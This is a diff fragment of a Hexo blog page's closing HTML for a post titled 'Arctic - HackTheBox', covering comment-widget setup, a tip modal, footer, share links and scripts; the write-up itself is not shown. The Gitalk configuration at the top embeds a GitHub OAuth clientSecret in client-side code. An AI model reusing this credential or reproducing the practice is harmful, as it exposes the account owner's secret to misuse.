+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/&title=《Arctic - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/&title=《Arctic - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Arctic - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLElEQVR42u3aQW7CQAwFUO5/aSp1hUSTfNuAyszLClGSzJuFa499u8XX/fd6/Pz4zdHvn+96/mv1yaMLAwPjaxn30+t5EUff9ADnT07WhoGBsQ/jk0G2+t7z32BgYGCc/6YHOH8+BgYGxjzgHi0oCa/5vRgYGBi9IraaIOZlcP7eF9TiGBgYX8joNQY+8/nt/Q0MDIx/z7gXr+TearL4glVhYGAszei1J6tJYRJe5+0EDAyMVRmTUa3ekESVFCWLGBgYGzAm41m9xkB+bNdsCWBgYCzESI668iSvt6A86F9sPQYGxjaMJOD2Gp/nyV91zAIDAwMjby72FtobwrhYDwYGxtKMXgGZF5m9oDzZLAwMjPUYyQuqO5GHxV4ZjIGBsQ8jOd6qjkREOxekjIWjOgwMjA0YvWP9vJHw2qbCH0/AwMBYmpEPXiTNgN4oajSimm8ZBgbGooz8xdXAmpfHk43AwMBYmzE5oK9evaGNqLjFwMBYmlFN4KopXbVhOUofMTAwFmXMm5TVpUezHvG7MDAw9mHkhWhS9OYNzl5b9OI/BgYGxnKMyWhFdbQrP4yr3ouBgbE2o3dkVi2Ae3clqScGBsYOjGqIrAbl6kZUW6oYGBj7MHpDD71iNdm/Hh4DA2MHRjWBqwbEcowP1oOBgYExOW57XzPgMBBjYGBgvIFRff4FBgMDYwNGUsQm53bnm1JNNwvFLQYGxtKMeQE5OUTL2wlRgoiBgbEa4wftr6h2mSOOOgAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
